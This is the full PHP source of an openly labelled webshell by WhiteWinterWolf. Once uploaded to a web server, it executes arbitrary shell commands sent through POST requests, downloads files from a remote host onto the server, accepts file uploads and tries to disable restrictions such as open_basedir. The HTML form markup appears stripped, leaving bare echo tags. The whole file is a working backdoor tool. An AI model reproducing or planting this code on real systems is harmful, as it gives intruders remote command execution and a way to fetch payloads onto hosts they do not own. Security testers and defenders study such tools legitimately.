<?php
/*******************************************************************************
 * Copyright 2017 WhiteWinterWolf
 * https://www.whitewinterwolf.com/tags/php-webshell/
 *
 * This file is part of wwolf-php-webshell.
 *
 * wwwolf-php-webshell is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 ******************************************************************************/

/*
 * Optional password settings.
 * Use the 'passhash.sh' script to generate the hash.
 * NOTE: the prompt value is tied to the hash!
 */
$passprompt = "WhiteWinterWolf's PHP webshell: ";
$passhash = "";

function e($s) { echo htmlspecialchars($s, ENT_QUOTES); }

function h($s)
{
	global $passprompt;
	if (function_exists('hash_hmac'))
	{
		return hash_hmac('sha256', $s, $passprompt);
	}
	else
	{
		return bin2hex(mhash(MHASH_SHA256, $s, $passprompt));
	}
}

function fetch_fopen($host, $port, $src, $dst)
{
	global $err, $ok;
	$ret = '';
	if (strpos($host, '://') === false)
	{
		$host = 'http://' . $host;
	}
	else
	{
		$host = str_replace(array('ssl://', 'tls://'), 'https://', $host);
	}
	$rh = fopen("${host}:${port}${src}", 'rb');
	if ($rh !== false)
	{
		$wh = fopen($dst, 'wb');
		if ($wh !== false)
		{
			$cbytes = 0;
			while (! feof($rh))
			{
				$cbytes += fwrite($wh, fread($rh, 1024));
			}
			fclose($wh);
			$ret .= "${ok} Fetched file <i>${dst}</i> (${cbytes} bytes)<br />";
		}
		else
		{
			$ret .= "${err} Failed to open file <i>${dst}</i><br />";
		}
		fclose($rh);
	}
	else
	{
		$ret = "${err} Failed to open URL <i>${host}:${port}${src}</i><br />";
	}
	return $ret;
}

function fetch_sock($host, $port, $src, $dst)
{
	global $err, $ok;
	$ret = '';
	$host = str_replace('https://', 'tls://', $host);
	$s = fsockopen($host, $port);
	if ($s)
	{
		$f = fopen($dst, 'wb');
		if ($f)
		{
			$buf = '';
			$r = array($s);
			$w = NULL;
			$e = NULL;
			fwrite($s, "GET ${src} HTTP/1.0\r\n\r\n");
			while (stream_select($r, $w, $e, 5) && !feof($s))
			{
				$buf .= fread($s, 1024);
			}
			$buf = substr($buf, strpos($buf, "\r\n\r\n") + 4);
			fwrite($f, $buf);
			fclose($f);
			$ret .= "${ok} Fetched file <i>${dst}</i> (" . strlen($buf) . " bytes)<br />";
		}
		else
		{
			$ret .= "${err} Failed to open file <i>${dst}</i><br />";
		}
		fclose($s);
	}
	else
	{
		$ret .= "${err} Failed to connect to <i>${host}:${port}</i><br />";
	}
	return $ret;
}

ini_set('log_errors', '0');
ini_set('display_errors', '1');
error_reporting(E_ALL);

while (@ ob_end_clean());

if (! isset($_SERVER))
{
	global $HTTP_POST_FILES, $HTTP_POST_VARS, $HTTP_SERVER_VARS;
	$_FILES = &$HTTP_POST_FILES;
	$_POST = &$HTTP_POST_VARS;
	$_SERVER = &$HTTP_SERVER_VARS;
}

$auth = '';
$cmd = empty($_POST['cmd']) ? '' : $_POST['cmd'];
$cwd = empty($_POST['cwd']) ? getcwd() : $_POST['cwd'];
$fetch_func = 'fetch_fopen';
$fetch_host = empty($_POST['fetch_host']) ? $_SERVER['REMOTE_ADDR'] : $_POST['fetch_host'];
$fetch_path = empty($_POST['fetch_path']) ? '' : $_POST['fetch_path'];
$fetch_port = empty($_POST['fetch_port']) ? '80' : $_POST['fetch_port'];
$pass = empty($_POST['pass']) ? '' : $_POST['pass'];
$url = $_SERVER['REQUEST_URI'];
$status = '';
$ok = '&#9786; :';
$warn = '&#9888; :';
$err = '&#9785; :';

if (! empty($passhash))
{
	if (function_exists('hash_hmac') || function_exists('mhash'))
	{
		$auth = empty($_POST['auth']) ? h($pass) : $_POST['auth'];
		if (h($auth) !== $passhash)
		{
			?><?php e($url); ?><?php e($passprompt); ?><?php
			exit;
		}
	}
	else
	{
		$status .= "${warn} Authentication disabled ('mhash()' missing).<br />";
	}
}

if (! ini_get('allow_url_fopen'))
{
	ini_set('allow_url_fopen', '1');
	if (! ini_get('allow_url_fopen'))
	{
		if (function_exists('stream_select'))
		{
			$fetch_func = 'fetch_sock';
		}
		else
		{
			$fetch_func = '';
			$status .= "${warn} File fetching disabled ('allow_url_fopen'"
				. " disabled and 'stream_select()' missing).<br />";
		}
	}
}
if (! ini_get('file_uploads'))
{
	ini_set('file_uploads', '1');
	if (! ini_get('file_uploads'))
	{
		$status .= "${warn} File uploads disabled.<br />";
	}
}
if (ini_get('open_basedir') && ! ini_set('open_basedir', ''))
{
	$status .= "${warn} open_basedir = " . ini_get('open_basedir') . "<br />";
}

if (! chdir($cwd))
{
  $cwd = getcwd();
}

if (! empty($fetch_func) && ! empty($fetch_path))
{
	$dst = $cwd . DIRECTORY_SEPARATOR . basename($fetch_path);
	$status .= $fetch_func($fetch_host, $fetch_port, $fetch_path, $dst);
}

if (ini_get('file_uploads') && ! empty($_FILES['upload']))
{
	$dest = $cwd . DIRECTORY_SEPARATOR . basename($_FILES['upload']['name']);
	if (move_uploaded_file($_FILES['upload']['tmp_name'], $dest))
	{
		$status .= "${ok} Uploaded file <i>${dest}</i> (" . $_FILES['upload']['size'] . " bytes)<br />";
	}
}
?><?php e($url); ?><?php if (ini_get('file_uploads')): ?><?php endif; ?><?php if (! empty($passhash)): ?><?php e($auth); ?><?php endif; ?><?php if (! empty($fetch_func)): ?><?php e($fetch_host); ?><?php e($fetch_port); ?><?php endif; ?><?php e($cwd); ?><?php if (ini_get('file_uploads')): ?><?php endif; ?><?php e($cmd); ?><?php
if (! empty($status))
{
	echo "<p>${status}</p>";
}

echo "<pre>";
if (! empty($cmd))
{
	echo "<b>";
	e($cmd);
	echo "</b>\n";
	if (DIRECTORY_SEPARATOR == '/')
	{
		$p = popen('exec 2>&1; ' . $cmd, 'r');
	}
	else
	{
		$p = popen('cmd /C "' . $cmd . '" 2>&1', 'r');
	}
	while (! feof($p))
	{
		echo htmlspecialchars(fread($p, 4096), ENT_QUOTES);
		@ flush();
	}
}
echo "</pre>";

exit;
?>